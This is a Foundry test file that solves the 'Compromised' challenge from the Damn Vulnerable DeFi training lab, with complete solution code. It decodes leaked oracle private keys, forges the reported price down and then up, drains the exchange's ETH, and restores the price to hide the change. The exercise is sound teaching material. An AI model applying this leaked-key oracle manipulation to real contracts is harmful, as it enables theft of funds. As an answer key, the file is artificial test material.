// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Base64} from "solady/utils/Base64.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [
        INITIAL_NFT_PRICE,
        INITIAL_NFT_PRICE,
        INITIAL_NFT_PRICE
    ];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices))
            .oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
            address(oracle)
        );
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        (uint256 firstOracleKey, uint256 secondOracleKey) = _decodeLeakedKeys();

        // Step 1: Manipulate price down to buy NFT cheaply
        _setOraclePrice(
            firstOracleKey,
            secondOracleKey,
            PLAYER_INITIAL_ETH_BALANCE
        );

        // Step 2: Buy the NFT at the manipulated low price
        vm.prank(player);
        exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
        assertEq(nft.ownerOf(0), player);

        // Step 3: Manipulate price up to sell NFT expensively
        uint256 highPrice = EXCHANGE_INITIAL_ETH_BALANCE +
            PLAYER_INITIAL_ETH_BALANCE;
        _setOraclePrice(firstOracleKey, secondOracleKey, highPrice);

        // Step 4: Sell NFT and transfer funds to recovery
        vm.startPrank(player);
        nft.approve(address(exchange), 0);
        exchange.sellOne(0);
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        // Step 5: Restore original price to pass validation
        _setOraclePrice(firstOracleKey, secondOracleKey, INITIAL_NFT_PRICE);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }

    function _decodeLeakedKeys() private view returns (uint256, uint256) {
        // Step 1: The HTTP payloads (hex-encoded Base64 strings)
        string
            memory firstPayload = "4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130";
        string
            memory secondPayload = "4d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535";

        // Step 2: Convert hex strings to Base64 strings
        string memory firstBase64Payload = string(vm.parseBytes(firstPayload));
        string memory secondBase64Payload = string(
            vm.parseBytes(secondPayload)
        );

        // Step 3: Decode these
        bytes memory firstPrivateKeyBytes = Base64.decode(firstBase64Payload);
        bytes memory secondPrivateKeyBytes = Base64.decode(secondBase64Payload);

        string memory firstPrivateKeyHex = string(firstPrivateKeyBytes);
        string memory secondPrivateKeyHex = string(secondPrivateKeyBytes);

        // Step 4: Parse the private keys and get the addresses
        uint256 firstPrivateKey = vm.parseUint(firstPrivateKeyHex);
        address firstOracle = vm.addr(firstPrivateKey);

        assertEq(
            oracle.hasRole(oracle.TRUSTED_SOURCE_ROLE(), firstOracle),
            true
        );

        uint256 secondPrivateKey = vm.parseUint(secondPrivateKeyHex);
        address secondOracle = vm.addr(secondPrivateKey);
        assertEq(
            oracle.hasRole(oracle.TRUSTED_SOURCE_ROLE(), secondOracle),
            true
        );

        return (firstPrivateKey, secondPrivateKey);
    }

    /**
     * Helper function to set oracle price using both compromised oracles
     */
    function _setOraclePrice(
        uint256 firstOracleKey,
        uint256 secondOracleKey,
        uint256 price
    ) private {
        // Update price with first oracle
        vm.broadcast(firstOracleKey);
        oracle.postPrice(symbols[1], price);

        // Update price with second oracle
        vm.broadcast(secondOracleKey);
        oracle.postPrice(symbols[2], price);
    }
}
